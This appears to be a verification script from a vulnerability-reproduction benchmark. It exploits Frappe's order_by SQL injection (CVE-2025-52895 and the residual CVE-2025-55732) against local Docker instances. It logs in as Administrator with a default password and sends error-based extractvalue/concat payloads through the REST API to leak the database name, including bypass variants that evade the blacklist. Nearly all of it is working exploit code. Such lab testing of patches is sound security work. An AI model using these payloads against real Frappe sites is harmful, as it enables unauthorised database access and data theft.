#!/usr/bin/env bash
# verify.sh --seed|--residual — Frappe order_by SQL 注入（CVE-2025-52895 seed / CVE-2025-55732 residual）
#
# 漏洞机制：frappe/model/db_query.py validate_order_by_and_group_by 对 order_by 做黑名单检查后
# 原样拼入 ORDER BY。canary = 每次运行的 MySQL schema 名 ${RUN_FLAG}_<ver>（compose DB_NAME 注入），
# 经 extractvalue(1,concat(0x7e,database())) 的 XPATH 错误消息泄漏。
#   seed     "1 and sleep(0) or extractvalue(1,concat(0x7e,database()))"
#            V0(15.57.0) exact-match 黑名单（"1 and sleep" != "sleep"）放行 -> 泄漏 RUN_FLAG
#            V1(15.58.0) substring 检查 any("sleep" in function) 捕获 -> 阻断
#   residual "extractvalue(1,concat(0x7e,database()))"
#            V1 黑名单仅 {sleep}，extractvalue 不在 -> 泄漏 RUN_FLAG
#            V2(15.74.2) 正则 + 扩充黑名单 -> 阻断
#
# MariaDB XPATH 错误窗口约 28 字符，平台 PCBFLAG_* 长于窗口，故同一 sink 再打
# substr(database(),1,28) / substr(database(),29,28) 两片拼回完整 schema 名。
# seed 片仍带 sleep 包装（v1 阻断）；residual 片不带 sleep。
#
# 效果通道：REST API 响应 body（MySQL "XPATH syntax error: '~…'"），
# 检出 RUN_FLAG（提交值）=> rc=0。
# 登录（Administrator/admin，Host: v<n>.local 站点路由）失败视为环境失败 rc=20。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 宿主端口：docker compose port 动态解析（服务名 frappe-v0/v1/v2，容器端口 8000），回退固定映射
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "frappe-$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
case "$VERSION" in
  v0) FIXED=39630;; v1) FIXED=39631;; v2) FIXED=39632;; *) FIXED=39631;;
esac
PORT="${PORT:-$FIXED}"

"$PY" - "$MODE" "$PORT" "$RUN_FLAG" "$VERSION" <<'PYEOF'
import http.cookiejar, json, re, sys, urllib.parse, urllib.request, urllib.error

mode, port, flag, version = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
# seed keeps the CVE-2025-52895 sleep wrapper; residual is the 55732 bypass
# (extractvalue / database not in the v1 {sleep} substring blacklist).
if mode == "--seed":
    payloads = [
        "1 and sleep(0) or extractvalue(1,concat(0x7e,database()))",
        "1 and sleep(0) or extractvalue(1,concat(0x7e,substr(database(),1,28)))",
        "1 and sleep(0) or extractvalue(1,concat(0x7e,substr(database(),29,28)))",
    ]
else:
    payloads = [
        "extractvalue(1,concat(0x7e,database()))",
        "extractvalue(1,concat(0x7e,substr(database(),1,28)))",
        "extractvalue(1,concat(0x7e,substr(database(),29,28)))",
    ]
site_host = "v" + version[-1] + ".local"
base = "http://127.0.0.1:%s" % port

class _HostHeader(urllib.request.BaseHandler):
    def __init__(self, host):
        self._host = host
    def http_request(self, req):
        req.add_unredirected_header("Host", self._host)
        return req
    https_request = http_request

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), _HostHeader(site_host))

try:
    data = urllib.parse.urlencode({"usr": "Administrator", "pwd": "admin"}).encode()
    req = urllib.request.Request(base + "/api/method/login", data=data)
    r = opener.open(req, timeout=20)
    if r.getcode() != 200:
        print(json.dumps({"mode": mode, "port": port, "error": "login status %s" % r.getcode()}))
        sys.exit(20)
except Exception as e:
    print(json.dumps({"mode": mode, "port": port, "error": "login-failed: " + str(e)[:200]}))
    sys.exit(20)

combined = []
pieces = []
last_status, last_payload = None, payloads[0]
for payload in payloads:
    url = (base + "/api/resource/User?order_by=" + urllib.parse.quote(payload, safe='')
           + "&limit_page_length=1")
    try:
        with opener.open(urllib.request.Request(url), timeout=30) as r:
            status, resp = r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        status, resp = e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        print(json.dumps({"mode": mode, "port": port, "error": str(e)[:200]}))
        sys.exit(20)
    last_status, last_payload = status, payload
    combined.append(resp or "")
    # Only substr() windows are complete (no trailing '...').
    if "substr(database()" in payload:
        m = re.search(r"XPATH syntax error: '~([^']+)'", resp or "")
        if m and "..." not in m.group(1):
            pieces.append(m.group(1))

body = "\n".join(combined)
leaked = "".join(pieces)
ok = flag in leaked or flag in body
print(json.dumps({"mode": mode, "port": port, "order_by": last_payload,
                  "http_status": last_status, "flag_in_body": ok}))
if leaked:
    print("leaked_schema=" + leaked)
print(body[:800])
sys.exit(0 if ok else 10)
PYEOF
RC=$?
echo "verify rc=$RC (0=effect: flag leaked in XPATH error / 10=blocked)"
exit $RC
